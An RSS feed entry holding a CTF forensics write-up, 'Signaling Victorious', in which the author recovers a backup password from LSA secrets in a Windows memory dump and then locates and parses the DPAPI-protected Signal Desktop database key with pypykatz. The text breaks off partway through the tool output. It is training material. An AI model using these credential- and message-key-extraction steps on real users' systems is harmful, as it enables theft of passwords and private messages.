<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on Jeremy&#39;s Blog</title>
		<link>https://stolenfootball.github.io/posts/</link>
		<description>Recent content in Posts on Jeremy&#39;s Blog</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>en-us</language>
		<lastBuildDate>Wed, 18 Dec 2024 20:31:50 -0500</lastBuildDate>
		<atom:link href="https://stolenfootball.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>HackTheBox Binary Badlands 2024 - Signaling Victorious</title>
			<link>https://stolenfootball.github.io/posts/writeups/2024/htb-uni-ctf/signaling-victorious/</link>
			<pubDate>Wed, 18 Dec 2024 20:31:50 -0500</pubDate>
			
			<guid>https://stolenfootball.github.io/posts/writeups/2024/htb-uni-ctf/signaling-victorious/</guid>
			<description><![CDATA[%!s(<nil>)]]></description>
			<content type="html"><![CDATA[<p>This challenge came with two files - an encrypted 7-zip file named <code>backup.7z</code> and a memory dump named <code>win10_memdump.elf</code>. There was also a docker container available online running <a href="https://github.com/bc-security/starkiller">Starkiller</a>, which is a front-end management app for the post exploitation framework <a href="https://github.com/EmpireProject/Empire">PowerShell Empire</a>. When I visited the site, there was a login page requesting a username and password to access Starkiller, but no username and password were provided with the challenge.</p>
<p><img src="./images/1_starkiller.png" alt="Starkiller Login"></p>
<h2 id="accessing-the-backup">Accessing the backup</h2>
<p>The first thing I decided to do was attempt to decrypt the backup file. I tried a couple of basic passwords, but nothing worked. Next, I began to look through the memory dump using <a href="https://github.com/volatilityfoundation/volatility3">Volatility3</a>.</p>
<p>When scanning the processes that were active when the memory image was taken, I noticed two things. First, Signal was actively running. This stuck out at me, since the challenge was called <em>Signaling Victorious</em>, and I took note of it for later. The other process that jumped out was <code>backuper.exe</code>. Given the weird spelling and the fact that it was at the end of the process list (which usually indicates user-started processes), I figured it may be a custom backup application.</p>
<p><img src="./images/2_vol-pslist.png" alt="Volatility process scan"></p>
<p>Next I did a file scan looking for the <code>backuper.exe</code> application, and found it on the user&rsquo;s Desktop.</p>
<p><img src="./images/3_vol-filescan.png" alt="Volatility file scan"></p>
<p>I dumped the file using the <code>windows.dumpfiles.DumpFiles</code> plugin, and opened the executable in <a href="https://binary.ninja/">Binary Ninja</a>. I searched for strings, and found the command: <code>7z.exe a -t7z backup.7z \&quot;C:\\Users\\\&quot; -p%ws</code>, then found the function that utilizes that string in the XREFs. The pseudo-c (cleaned up a bit) of the function is below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    LSA_HANDLE LsaHandle <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    wchar16 <span style="color:#66d9ef">const</span><span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> OfflineBackupKey <span style="color:#f92672">=</span> u<span style="color:#e6db74">&#34;OfflineBackupKey&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> command;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>command, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xc8</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> _OBJECT_ATTRIBUTES ObjectAttributes;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>ObjectAttributes, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x30</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    NTSTATUS Status;
</span></span><span style="display:flex;"><span>    Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">LsaOpenPolicy</span>(nullptr, <span style="color:#f92672">&amp;</span>ObjectAttributes, <span style="color:#ae81ff">0x20</span>, <span style="color:#f92672">&amp;</span>LsaHandle);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> result;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Status)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">struct</span> LSA_UNICODE_STRING<span style="color:#f92672">*</span> LsaUnicodeString <span style="color:#f92672">=</span> nullptr;
</span></span><span style="display:flex;"><span>        NTSTATUS Status_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">LsaRetrievePrivateData</span>(LsaHandle, <span style="color:#f92672">&amp;</span>KeyName, <span style="color:#f92672">&amp;</span>LsaUnicodeString);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Status_1)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sprintf</span>(<span style="color:#f92672">&amp;</span>command, <span style="color:#ae81ff">0xc8</span>, <span style="color:#e6db74">&#34;7z.exe a -t7z backup.7z </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74"> -p%ws&#34;</span>, LsaUnicodeString<span style="color:#f92672">-&gt;</span>Buffer);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">execute</span>(<span style="color:#f92672">&amp;</span>command);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memset</span>(LsaUnicodeString, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>command, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xc8</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">LsaFree</span>(LsaUnicodeString);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">LsaClose</span>(LsaHandle);
</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">dbgPrint</span>(<span style="color:#e6db74">&#34;LsaRetrievePrivateData failed, e…&#34;</span>, <span style="color:#a6e22e">LsaNtStatusToWinError</span>(Status_1));
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">LsaClose</span>(LsaHandle);
</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dbgPrint</span>(<span style="color:#e6db74">&#34;LsaOpenPolicy failed, error: 0x%…&#34;</span>, <span style="color:#a6e22e">LsaNtStatusToWinError</span>(Status));
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The function retrieves the value <code>OfflineBackupKey</code> from the Windows Local Security Authority (LSA) and uses it as the password to encrypt the backup when it is zipped. The LSA is a common place within a Windows system that sensitive information such as passwords are stored, and it&rsquo;s contents can usually be retrieved if you have a memory dump.</p>
<p>I ran the <code>windows.lsadump.Lsadump</code> Volatility plugin, and retrieved the following:</p>
<p><img src="./images/4_vol-lsadump.png" alt="Volatility Lsadump"></p>
<p>The offline backup key is stored as a <code>UNICODE_STRING</code> , which is a common structure for storing strings in Windows programs. A <code>UNICODE_STRING</code> is defined as follows, with the actual string buffer stored in <code>UTF-16LE</code> format (again, incredibly common for Windows strings).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _UNICODE_STRING {
</span></span><span style="display:flex;"><span>  USHORT Length;
</span></span><span style="display:flex;"><span>  USHORT MaximumLength;
</span></span><span style="display:flex;"><span>  PWSTR  Buffer;
</span></span><span style="display:flex;"><span>} UNICODE_STRING, <span style="color:#f92672">*</span>PUNICODE_STRING;
</span></span></code></pre></div><p>Which means the key is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>OfflineBackupKey {
</span></span><span style="display:flex;"><span>  Length: <span style="color:#ae81ff">0x28</span>
</span></span><span style="display:flex;"><span>  MaximumLength: UNDEFINED
</span></span><span style="display:flex;"><span>  Buffer: <span style="color:#e6db74">&#34;yYj8g5Pk6h!-K3pBMSxF&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I used 7-zip and the key to decrypt the <code>backup.7z</code> file, and found a copy of the <code>C:\Users</code> directory of the computer.</p>
<p><img src="./images/5_backup-folder.png" alt="Users directory from backup"></p>
<h2 id="signal-messaging">Signal Messaging</h2>
<p>Given that the challenge was called <em>Signaling Victorious</em>, as well as the fact that Signal was one of the only user space applications running on the device, I figured the point of the challenge was to retrieve the Signal messages.</p>
<p>After some quick research, I found that the Signal Windows app stores its messages in the <code>%APPDATA%\Roaming\Signal\sql\db.sqlite</code> file. This is a SQL-Cipher encrypted database, and sure enough, the one on this device was encrypted.</p>
<p>This is where it got interesting. Apparently Signal used to store the key for this database in plaintext in <code>%APPDATA%\Roaming\Signal\config.json</code>. This obviously wasn&rsquo;t great (because <code>%APPDATA%\Roaming</code> is fairly accessible by default), but the person who broke this was apparently Elon Musk?</p>
<p><img src="./images/6_musk-tweet.png" alt="Musk tweet"></p>
<p>In a strange turn of events, Musk was absolutely right, I have no idea what was going on with the community note. Any user or program with access to the <code>%APPDATA%</code> folder could read all Signal messages, and this was a known issue in Signal since 2018 that was in fact not being addressed.</p>
<p><img src="./images/7_twilight-zone.gif" alt="Twilight zone gif"></p>
<p>Anyways, after all of the publicity that came in the aftermath of Musk&rsquo;s tweet, Signal decided fix the problem, and began to use device-native solutions to store all of its encryption keys. In Linux, this meant the keyring, on Mac, this means keychain, and on Windows, this means DPAPI.</p>
<h2 id="a-brief-aside---dpapi">A Brief Aside - DPAPI</h2>
<p>DPAPI is the Windows Data Protection API. Application developers can use the API through the <code>CryptProtectData</code> and <code>CryptUnprotectData</code> functions. <code>CryptProtectData</code> takes plaintext and returns a <code>DPAPI_BLOB</code> structure, which contains the encrypted data and metadata regarding the encryption. <code>CryptUnprotectData</code> takes a <code>DPAPI_BLOB</code>, and returns plaintext.</p>
<p>Under the hood DPAPI (when encrypting secrets for a specific user) uses a 64 byte &ldquo;Master Key&rdquo; during encryption, which is saved in the <code>%APPDATA\Roaming\Microsoft\Protect\[USER_SID]</code> folder. The Master Key is combined with the SHA1 hash of the user&rsquo;s password, the user&rsquo;s SID, and some metadata stored in the <code>DPAPI_BLOB</code> to derive the encryption key used to encrypt the plaintext.</p>
<p>The end result of all of this is that an application developer can store serialized <code>DPAPI_BLOB</code> structures on the disk and have a degree of assurance that they cannot be decrypted without the user&rsquo;s password.</p>
<p>For a more detailed discussion of DPAPI internals, I highly recommend the blog post I linked below. It does a great job of making a complex topic clear, and provides a lot of detail.</p>
<p><a href="https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/">https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/</a></p>
<h2 id="back-to-it">Back to it</h2>
<p>Theoretically, according to Signal, not much was changed in the actual storage of the database key after the update - they just replaced the <code>key</code> field in <code>config.json</code> with <code>encryptedKey</code>, which was encrypted using DPAPI. Below are examples of the previous &ldquo;plaintext&rdquo; config file and the new &ldquo;encrypted&rdquo; one after the update.</p>
<p>Old Version:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;key&#34;</span>: <span style="color:#e6db74">&#34;d07de8ee1be42b41d040cf9090a31115671cfe812a6305d0517a2da88bf5c7fc&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;mediaPermissions&#34;</span>: <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;mediaCameraPermissions&#34;</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>New Version:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;encryptedKey&#34;</span>: <span style="color:#e6db74">&#34;763130cc1843cbf3949e872b373031e89c85f8e8d6e9ec3bd9340bb9c6fd844ca424d7e666feac3663f6c2810d6ddbdfb82f7faa4456eda119bacd2709fc2404eeeb74e69b2b3f2f71e765b74a068c5549a1871559d537de08a25c700a97cd&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The problem is, this encrypted key is clearly not a DPAPI blob. Using the DPAPI blob parser built into <a href="https://github.com/skelsec/pypykatz">pypykatz</a>, we can see that.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jeremydunn@Jeremys-MacBook-Pro % pypykatz dpapi describe blob 763130cc1843cbf3949e872b373031e89c85f8e8d6e9ec3bd9340bb9c6fd844ca424d7e666feac3663f6c2810d6ddbdfb82f7faa4456eda119bacd2709fc2404eeeb74e69b2b3f2f71e765b74a068c5549a1871559d537de08a25c700a97cd
</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span> DPAPI_BLOB <span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>version: <span style="color:#ae81ff">3425710454</span>
</span></span><span style="display:flex;"><span>credential_guid: b<span style="color:#e6db74">&#39;\x18C\xcb\xf3\x94\x9e\x87+701\xe8\x9c\x85\xf8\xe8&#39;</span>
</span></span><span style="display:flex;"><span>masterkey_version: <span style="color:#ae81ff">1005382102</span>
</span></span><span style="display:flex;"><span>masterkey_guid: b90b34d9-fdc6-4c84-a424-d7e666feac36
</span></span><span style="display:flex;"><span>flags: <span style="color:#ae81ff">2177037923</span>
</span></span><span style="display:flex;"><span>description_length: <span style="color:#ae81ff">3755699469</span>
</span></span><span style="display:flex;"><span>description: b<span style="color:#e6db74">&#34;\xb8/\x7f\xaaDV\xed\xa1\x19\xba\xcd&#39;\t\xfc</span>$<span style="color:#e6db74">\x04\xee\xebt\xe6\x9b+?/q\xe7e\xb7J\x06\x8cUI\xa1\x87\x15Y\xd57\xde\x08\xa2\\p\n\x97\xcd&#34;</span>
</span></span><span style="display:flex;"><span>crypto_algorithm: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>crypto_algorithm_length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>salt_length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>salt: b<span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>HMAC_key_length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>HMAC_key: b<span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>hash_algorithm: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>HMAC: b<span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>data_length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>data: b<span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>signature_length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>signature: b<span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>hash_algorithm_length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>HMAC_length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>to_sign: b<span style="color:#e6db74">&#34;\xd6\xe9\xec;\xd94\x0b\xb9\xc6\xfd\x84L\xa4</span>$<span style="color:#e6db74">\xd7\xe6f\xfe\xac6c\xf6\xc2\x81\rm\xdb\xdf\xb8/\x7f\xaaDV\xed\xa1\x19\xba\xcd&#39;\t\xfc</span>$<span style="color:#e6db74">\x04\xee\xebt\xe6\x9b+?/q\xe7e\xb7J\x06\x8cUI\xa1\x87\x15Y\xd57\xde\x08\xa2\\p\n\x97\xcd&#34;</span>
</span></span></code></pre></div><p>None of the fields populate, and the ones that do are clearly incorrect.</p>
<p>So where is the actual DPAPI blob?</p>
<h2 id="a-breakthrough">A Breakthrough</h2>
<p>Figuring this out took a lot longer than I care to admit. If I&rsquo;d been smart, I probably could have just grepped for the GUID of the data provider used for DPAPI (which is always the same and is a part of every valid blob), but I didn&rsquo;t think of that until days later.</p>
<p>What I did eventually do (after much trial and error) is find an open-source <a href="https://github.com/bepaald/signalbackup-tools">Signal backup tool</a> which is still in active development. Since they have to decrypt the data in order to back it up, I figured they&rsquo;d know where the DPAPI blob with the key was stored on the disk.</p>
<p>I searched through the Github repo for the string &ldquo;DPAPI&rdquo;, and came across <a href="https://github.com/bepaald/signalbackup-tools/blob/82ee591f5115576210ab8ddc1c01d1d1ec5ff2d4/desktopdatabase/getkeyfromencrypted_win.cc#L85">getkeyfromencrypted_win.cc</a>.</p>
<p>From this tool, I learned a couple of important things.</p>
<p>First, Signal appends the string &ldquo;DPAPI&rdquo; in ASCII to the front of the blob after it gets returned from <code>CryptProtectData</code>, and then strips it off again before sending it to <code>CryptUnprotectData</code>. I can&rsquo;t even begin to guess why, <code>DPAPI_BLOB</code> structures already have a unique signature in the form of the provider GUID, so it&rsquo;s not like another magic number is necessary. Maybe someone&rsquo;s bonus was attached to the number of lines of code they wrote?</p>
<p>The relevant code from <code>getkeyfromencrypted_win.cc</code> is here:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">// the encrypted key starts with &#39;D&#39; &#39;P&#39; &#39;A&#39; &#39;P&#39; &#39;I&#39; {0x44, 0x50, 0x41, 0x50, 0x41}, skip this...
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DATA_BLOB encrypted_encryptedkey_key_blob{static_cast<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">&gt;</span>(encrypted_encryptedkey_key.second <span style="color:#f92672">-</span> <span style="color:#a6e22e">STRLEN</span>(<span style="color:#e6db74">&#34;DPAPI&#34;</span>)), encrypted_encryptedkey_key.first <span style="color:#f92672">+</span> <span style="color:#a6e22e">STRLEN</span>(<span style="color:#e6db74">&#34;DPAPI&#34;</span>)};
</span></span></code></pre></div><p>Second, the blob is stored under the json key <code>encrypted_key</code>, not <code>encryptedKey</code> as seen in <code>config.json</code> (snake case supremacy yet again). Unfortunately, <code>getkeyfromencrypted_win.cc</code> seems to be getting the key by doing a regex search of the <code>%APPDATA%\Roaming\Signal\Local State</code> file for <code>encrypted_key</code> and pulling the blob out of the regex.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// 2. get the key to decrypt the encrypted key
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//*****  2a. get the base64 encoded encrypted key to decrypt the encrypted key ******//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>std<span style="color:#f92672">::</span>fstream <span style="color:#a6e22e">localstate</span>(d_configdir <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/Local State&#34;</span>, std<span style="color:#f92672">::</span>ios_base<span style="color:#f92672">::</span>in <span style="color:#f92672">|</span> std<span style="color:#f92672">::</span>ios_base<span style="color:#f92672">::</span>binary);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>localstate.<span style="color:#a6e22e">is_open</span>())
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  Logger<span style="color:#f92672">::</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Failed to open input: &#34;</span>, d_configdir, <span style="color:#e6db74">&#34;/Local State&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>std<span style="color:#f92672">::</span>string line;
</span></span><span style="display:flex;"><span>std<span style="color:#f92672">::</span>regex <span style="color:#a6e22e">keyregex</span>(<span style="color:#e6db74">&#34;.*</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">encrypted_key</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">s*</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">([^</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]*)</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">.*&#34;</span>);
</span></span><span style="display:flex;"><span>std<span style="color:#f92672">::</span>smatch m;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> found <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (std<span style="color:#f92672">::</span><span style="color:#a6e22e">getline</span>(localstate, line))
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//std::cout &lt;&lt; &#34;Line: &#34; &lt;&lt; line &lt;&lt; std::endl;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (std<span style="color:#f92672">::</span><span style="color:#a6e22e">regex_match</span>(line, m, keyregex))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (m.<span style="color:#a6e22e">size</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) <span style="color:#75715e">// m[0] is full match, m[1] is first submatch (which we want)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
</span></span><span style="display:flex;"><span>      found <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>found)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  Logger<span style="color:#f92672">::</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Failed to read key from Local State&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I can&rsquo;t hate on this codebase too much since they provided my major breakthrough for the challenge, but for the love of all that is good in this world people json parsers were invented for a reason.</p>
<p>Also, as a side note - why does <code>Local State</code> not have a file extension? Why is there a space? Who at Signal is doing code review?</p>
<p>Regardless, in the <code>Local State</code> file, we finally have what we are looking for:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;os_crypt&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;audit_enabled&#34;</span>: <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;encrypted_key&#34;</span>: <span style="color:#e6db74">&#34;RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAD8tnGruNB7TaoSbs4Z/xkXEAAAABIAAABDAGgAcgBvAG0AaQB1AG0AAAAQZgAAAAEAACAAAACKakPvCWDeRdef30ik+0RfHTUXhQrfAdfcEOuzfv8sDQAAAAAOgAAAAAIAACAAAAAad9BHSVFuYmI0D8QG9924xL4pzewU1LemGmaTlTzcOjAAAAAg0SNGW/NP4egaKEv0Tgl9JE3d0tFQpx6G6lMcoOlF3EyR/dr0hbbBbQksTEkECcxAAAAAHaurRLkbh4yTcD+/hxG67Vfa0zLEIJpQOAWw6BIDUw+jRHY3AuIU0wdyxy5lv6CZEYmIQqUbyJSXzPIPpqYn6w==&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>After decoding the Base64 and stripping the incredibly necessary &ldquo;DPAPI&rdquo; from the front, we can use <code>pypykatz</code> to decode the <code>DPAPI_BLOB</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jeremydunn@Jeremys-MacBook-Pro % pypykatz dpapi describe blob 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000fcb671abb8d07b4daa126ece19ff191710000000120000004300680072006f006d00690075006d0000001066000000010000200000008a6a43ef0960de45d79fdf48a4fb445f1d3517850adf01d7dc10ebb37eff2c0d000000000e80000000020000200000001a77d04749516e6262340fc406f7ddb8c4be29cdec14d4b7a61a6693953cdc3a3000000020d123465bf34fe1e81a284bf44e097d244dddd2d150a71e86ea531ca0e945dc4c91fddaf485b6c16d092c4c490409cc400000001dabab44b91b878c93703fbf8711baed57dad332c4209a503805b0e81203530fa344763702e214d30772c72e65bfa09911898842a51bc89497ccf20fa6a627eb
</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span> DPAPI_BLOB <span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>version: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>credential_guid: b<span style="color:#e6db74">&#39;\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb&#39;</span>
</span></span><span style="display:flex;"><span>masterkey_version: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>masterkey_guid: ab71b6fc-d0b8-4d7b-aa12-6ece19ff1917
</span></span><span style="display:flex;"><span>flags: <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>description_length: <span style="color:#ae81ff">18</span>
</span></span><span style="display:flex;"><span>description: b<span style="color:#e6db74">&#39;C\x00h\x00r\x00o\x00m\x00i\x00u\x00m\x00\x00\x00&#39;</span>
</span></span><span style="display:flex;"><span>crypto_algorithm: <span style="color:#ae81ff">26128</span>
</span></span><span style="display:flex;"><span>crypto_algorithm_length: <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>salt_length: <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>salt: b<span style="color:#e6db74">&#39;\x8ajC\xef\t`\xdeE\xd7\x9f\xdfH\xa4\xfbD_\x1d5\x17\x85\n\xdf\x01\xd7\xdc\x10\xeb\xb3~\xff,\r&#39;</span>
</span></span><span style="display:flex;"><span>HMAC_key_length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>HMAC_key: b<span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>hash_algorithm: <span style="color:#ae81ff">32782</span>
</span></span><span style="display:flex;"><span>HMAC: b<span style="color:#e6db74">&#39;\x1aw\xd0GIQnbb4\x0f\xc4\x06\xf7\xdd\xb8\xc4\xbe)\xcd\xec\x14\xd4\xb7\xa6\x1af\x93\x95&lt;\xdc:&#39;</span>
</span></span><span style="display:flex;"><span>data_length: <span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>data: b<span style="color:#e6db74">&#39; \xd1#F[\xf3O\xe1\xe8\x1a(K\xf4N\t}$M\xdd\xd2\xd1P\xa7\x1e\x86\xeaS\x1c\xa0\xe9E\xdcL\x91\xfd\xda\xf4\x85\xb6\xc1m\t,LI\x04\t\xcc&#39;</span>
</span></span><span style="display:flex;"><span>signature_length: <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>signature: b<span style="color:#e6db74">&#34;\x1d\xab\xabD\xb9\x1b\x87\x8c\x93p?\xbf\x87\x11\xba\xedW\xda\xd32\xc4 \x9aP8\x05\xb0\xe8\x12\x03S\x0f\xa3Dv7\x02\xe2\x14\xd3\x07r\xc7.e\xbf\xa0\x99\x11\x89\x88B\xa5\x1b\xc8\x94\x97\xcc\xf2\x0f\xa6\xa6&#39;\xeb&#34;</span>
</span></span><span style="display:flex;"><span>hash_algorithm_length: <span style="color:#ae81ff">512</span>
